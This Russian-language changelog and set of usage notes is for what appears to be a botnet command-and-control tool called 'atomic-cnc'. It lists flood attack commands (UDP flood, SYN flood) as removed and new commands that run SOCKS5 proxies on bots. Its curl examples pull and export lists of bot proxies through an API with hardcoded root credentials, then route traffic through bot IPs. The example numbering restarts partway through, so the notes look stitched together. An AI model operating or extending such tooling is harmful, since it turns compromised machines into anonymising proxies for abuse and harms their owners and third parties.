НОВЫЕ КОМАНДЫ:

  proxy stop
  proxy list
  proxy stats
  proxy export

ИЗМЕНЕНЫ:
  bots         - показывает статус прокси
  methods      - показывает proxy команды

УДАЛЕНЫ:
  ongoing      - просмотр атак (не нужно)
  .udpthread   - UDP flood (удалено)
  .synflood    - SYN flood (удалено)
  и все другие команды атак

ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ
================================================================================

1. ЗАПУСК ПРОКСИ:
   > proxy start port=1080 auth=false maxconns=50

2. ПОЛУЧЕНИЕ СПИСКА:
   curl "http://server:81/proxies?user=root&password=pass"

3. ИСПОЛЬЗОВАНИЕ ПРОКСИ:
   curl -x socks5://192.168.1.100:1080 https://api.ipify.org

4. ЭКСПОРТ СПИСКА:
   curl "http://server:81/proxy/list?user=root&password=pass&format=ip:port" > proxies.txt

5. СТАТИСТИКА:
   > proxy stats

2. Подключение ботов:
   ./atomic-cnc
   ./release/debug.dbg

3. Запуск прокси:
   > proxy start port=1080
   > proxy list

4. Тест прокси:
   curl -x socks5://bot-ip:1080 https://api.ipify.org

5. API тесты:
   curl "http://localhost:81/proxies?user=root&password=root@123"
   curl "http://localhost:81/proxy/stats?user=root&password=root@123"
